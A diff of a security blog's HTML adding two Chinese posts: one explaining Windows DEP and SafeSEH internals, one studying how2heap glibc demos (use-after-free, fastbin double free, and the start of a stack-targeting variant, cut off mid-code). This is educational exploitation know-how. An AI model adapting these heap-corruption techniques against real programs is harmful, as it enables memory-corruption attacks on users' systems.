@@ -252,6 +252,407 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/01/windows安全保护机制-DEP浅析/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/03/01/windows安全保护机制-DEP浅析/" itemprop="url">windows安全保护机制--DEP浅析</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-01T17:23:43+08:00">
+                2019-03-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="windows安全保护机制–DEP浅析"><a href="#windows安全保护机制–DEP浅析" class="headerlink" title="windows安全保护机制–DEP浅析"></a>windows安全保护机制–DEP浅析</h3><p>在温哥华Pwn2Own黑客大赛中，微软windows 7系统的ASLR技术和DEP技术都被选手成功绕过，但不可否认，ASLR和DEP确实是如微软IE小组经理所说，是“非常有效的保护机制”。</p>
+<p>溢出攻击可谓是最常见的攻击手段之一，本质上溢出攻击都是利用了现代计算机体系结构上的设计缺陷，而重塑整个体系必然是不现实的，于是就有了各种各样的保护机制来弥补。<em>在Windows XP SP2之前，利用代码（exp）会在分配的内存页执行，不需要检查<a href="http://msdn.microsoft.com/en-us/library/aa366786%28VS.85%29.aspx" target="_blank" rel="noopener">内存保护常量</a>（Memory Protection Constants）。例如，如果使用指定分配权限为PAGE_READWRITE 的<a href="http://msdn.microsoft.com/en-us/library/aa366887.aspx" target="_blank" rel="noopener">VirtualAlloc ()</a>函数分配了内存页, 则仍然可以从该内存页执行代码。从 windows XP SP2 和 windows Server 2003 SP1 开始, 如果 CPU 支持执行禁用 (XD) （针对Intel CPU）或不可执行 (NX)（针对AMD CPU) 位，则任何从被标记为PAGE_READWRITE（例）的内存页执行代码的行为，都将触发 STATUS_ACCESS_VIOLATION (0xC0000005) 访问冲突异常。</em>而微软在windows xp sp2上开始提供的DEP，全称为数据执行保护，英文为Data Execution Prevention，则是一种更加有效的修补手段。</p>
+<p>DEP根据其实现机制的不同分为硬件DEP和软件DEP，linux上的NX即为硬件DEP，而windows提供NX和SafeSEH（即为软件DEP）两种机制。一句话概括其功能：对于部分内存页不给予执行权限。</p>
+<h2 id="硬件DEP"><a href="#硬件DEP" class="headerlink" title="硬件DEP"></a>硬件DEP</h2><p>硬件DEP的实现需要CPU的支持，其中AMD cpu提供了No-Execute Page-Protection（就是NX），而intel则是Execute Disable Bit（XD），可以在”我的电脑”-&gt;右键菜单”属性”-&gt;”高级”-&gt;”性能 - 设置”-&gt;”数据执行保护”或者是在C:\boot.ini来设置相关选项和查看cpu是否支持DEP，分为四种模式，一般计算机提供的是前两种：</p>
+<ul>
+<li>optout模式，除了指定的程序以外其他的程序都使用</li>
+<li><p>optin模式，只为windows的程序和服务开启</p>
+</li>
+<li><p>AlwaysOn模式，所有进程强制开启，仅支持64位（不建议开启，某些dll并不能开启）</p>
+</li>
+<li>AlwaysOff模式，所有进程强制关闭</li>
+</ul>
+<p>硬件DEP的实现机制是操作系统通过设置内存页的NX/XD属性标记，来指明不能从该内存执行代码。为了实现这个功能，需要在内存的页面表（Page Table）中加入一个特殊的标识位（NX/XD）来标识是否允许在该页上执行指令。当该标识位设置为0里表示这个页面允许执行指令，设置为1时表示该页面不允许执行指令。在64位的操作系统中也就是页表项的第63bit，而在32位的操作系统中略显复杂，因为32位的pte并没有多余的bit可以存放这个标识位，所以要利用PAE进行扩展，在没有PAE的情况下32位的系统不支持<em>硬件DEP</em></p>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g0mj4b63s0j31ci0u0tmy.jpg" alt="image-20190228225631962"></p>
+<p>那它在底层到底是如何实现的呢？我们可与通过VirtualProtect()这个api函数来深入探索，这个函数的具体功能就是改变指定的内存页的属性，该函数的调用链如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VirtualProtect() --&gt; VirtualProtectEx() --&gt; ZwProtectVirtualMemory()</span><br></pre></td></tr></table></figure>
+<p>接着通过sysenter进入内核，调用号为0x89，相应的调用是NtProtecVirtualMemory()，之后调用链如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NtProtecVirtualMemory() --&gt; MiProtectVirtualMemory() --&gt; MiFlushTbAndCapture() --&gt; KeInterlockedSwapPte()</span><br></pre></td></tr></table></figure>
+<p>注意，其中在MiProtectVirtualMemory()中，会计算出要改变其bit的内存页的PTE的地址，最后由KeInterlockedSwapPte()来改变指定PTE的属性。</p>
+<p>来看看其汇编代码进行分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nt!KeInterlockedSwapPte:</span><br><span class="line">80541c08 53 push ebx</span><br><span class="line">80541c09 56 push esi</span><br><span class="line">80541c0a 8b5c2410 mov ebx,dword ptr [esp+10h] ;ebx为新的PTE的地址</span><br><span class="line">80541c0e 8b74240c mov esi,dword ptr [esp+0Ch] ;esi为旧的PTE地址</span><br><span class="line">80541c12 8b4b04 mov ecx,dword ptr [ebx+4] ;ecx为新PTE值高双字</span><br><span class="line">80541c15 8b1b mov ebx,dword ptr [ebx] ;ebx为PTE值低双字</span><br><span class="line">80541c17 8b5604 mov edx,dword ptr [esi+4] ;edx为旧PTE值高双字</span><br><span class="line">80541c1a 8b06 mov eax,dword ptr[esi] ;eax为旧PTE值低双字</span><br><span class="line">80541c1c 0fc70e cmpxchg8b qword ptr [esi];比较新旧是否相等，如果不想等用新的代替旧的</span><br></pre></td></tr></table></figure>
+<h2 id="软件DEP"><a href="#软件DEP" class="headerlink" title="软件DEP"></a>软件DEP</h2><p>SafeSEH则是一种在软件层面实现的对SEH的保护机制，它需要操作系统和编译器的双重支持，在vs2013及以后的版本中会自动启用 /SafeSEH 链接选项来使用SafeSEH。也正是因为该项技术使得以往简单的覆盖异常处理句柄的漏洞利用几乎失效了</p>
+<p>在加载PE文件时，SafeSEH将定位合法的SEH表的地址（如果该映像不支持SafeSEH的话则地址为0），然后是用共享内存中的一个随机数进行加密处理，程序中所有的异常处理函数的地址提取出来汇总放入SEH表，并将该表放入程序映像中，还会将将加密后的SEH函数表地址，IMAGE的开始地址，IMAGE的长度，合法SEH函数的个数，作为一条记录放入ntdll（ntdll模块是进行异常分发的模块）的加载模块数据内存中,每次调用异常处理函数时都会进行校验，只有二者一致才能够正常进行，该处理由RtlDispatchException() 开始，首先会经历两次检查，分别是：</p>
+<ul>
+<li>检查异常处理链是否在当前的栈中，不是则终止</li>
+<li>检查异常处理函数的指针是否指向栈，是则终止</li>
+</ul>
+<p>通过两次检查后会调用RtlIsValidHandler() 来进行异常的有效性检查，08年的black hat给出了该函数的细节</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">RtlIsValidHandler</span><span class="params">( handler )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (handler is in the loaded image)      <span class="comment">// 是否在loaded的空间内</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (image has <span class="built_in">set</span> the IMAGE_DLLCHARACTERISTICS_NO_SEH flag) <span class="comment">//是否设置了忽略异常</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;                  </span><br><span class="line">        <span class="keyword">if</span> (image has a SafeSEH table)       <span class="comment">// 是否含有SEH表</span></span><br><span class="line">            <span class="keyword">if</span> (handler found in the table)  <span class="comment">// 异常处理函数地址是否表中</span></span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">        <span class="keyword">if</span> (image is a .NET assembly with the ILonl	y flag <span class="built_in">set</span>)</span><br><span class="line">            <span class="keyword">return</span> FALSE;                    </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (handler is on non-executable page)   <span class="comment">// handler是否在不可执行页上</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ExecuteDispatchEnable bit <span class="built_in">set</span> in the process flags) <span class="comment">//DEP是否开启</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;                     </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            raise ACCESS_VIOLATION;          </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (handler is <span class="keyword">not</span> in an image)          <span class="comment">// handler是否在未加载空间</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ImageDispatchEnable bit <span class="built_in">set</span> in the process flags) <span class="comment">//设置的标志位是否允许</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;                     </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;                             /s/ 允许执行异常处理函数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>代码中的ExecuteDispatchEnable和ImageDispatchEnable位标志是内核KPROCESS结构的一部分，这两个位用来控制当异常处理函数在不可以执行内存或者不在异常模块的映像（IMAGE）内时，是否执行异常处理函数。这两个位的值可以在运行时修改，不过默认情况下如果进程的DEP被关闭，则这两个位置1，如果进程的DEP是开启状态，则这两个位被置0。</p>
+<p>通过源码我们可以看出，RtlIsValidHandler() 函数只会在以下几种情况执行异常处理函数</p>
+<ul>
+<li><p>在进程的DEP是开启的情况下</p>
+<ul>
+<li><p>异常处理函数和进程映像的SafeSEH表匹配且没有NO_SEH标志。</p>
+</li>
+<li><p>异常处理函数在进程映像的可执行页，并且没有NO_SEH标志，没有SafeSEH表，没有.NET的ILonly标志。</p>
+</li>
+</ul>
+</li>
+<li><p>在进程的DEP关闭的情况下</p>
+<ul>
+<li><p>异常处理函数和进程映像的SafeSEH表匹配没有NO_SEH标志。</p>
+</li>
+<li><p>异常处理函数在进程映像的可执行页，并且没有NO_SEH标志，没有SafeSEH表，没有.NET的ILonly标志。</p>
+</li>
+<li><p>异常处理函数不在当前进程的映像里面，但是不在当前线程的堆栈上。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>看雪翻译小组 <a href="https://bbs.pediy.com/thread-226625.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-226625.htm</a></p>
+<p>safeSEH笔记<a href="http://pstgroup.blogspot.com/2007/08/tipssafeseh.html" target="_blank" rel="noopener">http://pstgroup.blogspot.com/2007/08/tipssafeseh.html</a></p>
+<p>DEP的保护原理<a href="http://netsecurity.51cto.com/art/201107/276497.htm" target="_blank" rel="noopener">http://netsecurity.51cto.com/art/201107/276497.htm</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/15/how2heap学习（1）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/15/how2heap学习（1）/" itemprop="url">how2heap学习（1）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-15T16:49:08+08:00">
+                2019-01-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>#how2heap</p>
+<p>寒假了终于有大把大把的时间来集中学习了，自己也制定了计划，希望自己能坚持下来吧。how2heap是表哥推荐的，涵盖了很多知识点，寒假前段时间会系统的总结一下，相关题目的wp估计会另外开一个，这个权当是知识点的总结了，也是为了方便之后自己复习</p>
+<p>还有一篇关于内存管理的文章相当不错，也放这里码着</p>
+<p><a href="http://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf" target="_blank" rel="noopener">http://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf</a></p>
+<h2 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h2><p>首先来看源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This can be exploited in a use-after-free situation.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line">    <span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(512): %p\n"</span>, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(256): %p\n"</span>, b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"we could continue mallocing here...\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"now let's put a string at a that we can read later \"this is A!\"\n"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(a, <span class="string">"this is A!"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n"</span>, a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, let's allocate 500 bytes\n"</span>);</span><br><span class="line">    c = <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(500): %p\n"</span>, c);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And put a different string here, \"this is C!\"\n"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(c, <span class="string">"this is C!"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd allocation %p points to %s\n"</span>, c, c);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we reuse the first allocation, it now holds the data from the third allocation."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先是申请了两块内存，并让a、b分别指向它们，然后将a的内存空间存入字符串“this is A”，然后free了a，这里我们注意到，a的内存free了，但是a并没有被我们人为的改变指针的指向，a的指针目标仍然是之前的内存，即使已经free了。</p>
+<p>然后我们又malloc了内存给了c，注意这里malloc的内存大小是小于a的。这里就会发生<strong>first-fit</strong>，简单的说，glibc在malloc时会检查free_chunk，当free_chunk的大小足够时，glibc会优先分配这个chunk，所以我们这里的c实际上也就是指向我们最开始分配的内存地址的。</p>
+<p>接着将“this is C”给了c指向的内存，接着输出a、c，通过前面的解释我们已经知道了，a、c都应该会输出“this is C”</p>
+<p>当我们分配了a、b后堆的情况如下所示</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fz7dx2l9l6j30ei0g8q7h.jpg" alt="image-20190115171244727">1</p>
+<p>继续运行可以看到a的内存地址里存储的内容</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fz7e09n3fcj30im02cjsc.jpg" alt="image-20190115171549866"></p>
+<p>接着程序会free掉a，我们可以在unsortedbin里看到</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fz7e2ei9yjj30xi02qmym.jpg" alt="image-20190115171752114"></p>
+<p>当我们malloc后，我们存入“this is c”，然后再次打印a指向的地址</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fz8habshuxj30ga032wfq.jpg" alt="image-20190116155445184"></p>
+<p>结果和我们预测的一样。</p>
+<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>这个例子像我们展示了利用fastbin的free机制来实现double free</p>
+<p>源码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序首先分配了三块较小的内存，然后free了a，此时，a就会进入了fastbin中，且位于top。由于a是top，所以再次的free是不被允许的。此时list的状态如下(fastbin的chunk没有bk，而a的front为NULL)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list = [0x602000&lt;-0x0]</span><br></pre></td></tr></table></figure>
+<p>继续运行程序到b、c被free，同样进入了fastbin，c成为了top，而由于a不再是top，所以a可以再次被free</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list = [0x602040-&gt;0x602020-&gt;0x602000&lt;-0x0]</span><br></pre></td></tr></table></figure>
+<p>而当我们真正去再次free之后就会导致a再次成为top，这样就形成了一个环状结构</p>
+<p>下面再次分配三个chunk，我们会发现第一个分配的还是0x602000，第二个则是0x602040，第三则是0x602020，完全符合之前的fastbin结构，程序到这里就结束了，但我们很好奇，如果继续malloc会发生什么呢？简单修改程序后我们再次运行</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fz8ibenyvrj30hg01kq37.jpg" alt="image-20190116163028130"></p>
+<p>可以看到它分配的第四个chunk还是0x602000，也印证了我们刚才所说的环形结构，同时我们也知道了，假如我们有两个malloc的chunk分别是a、b，且通过double free使之形成类似的结构，当我们malloc a时，b成了fastbin的top，malloc b，a就成了fastbin的top，有种自动free的感觉。。。。</p>
+<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p>实际上是在前面知识的基础上又近了一步，尝试去欺骗malloc返回一个我们可控区域的指针，还是先上源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span></span><br><span class="line">	       <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span 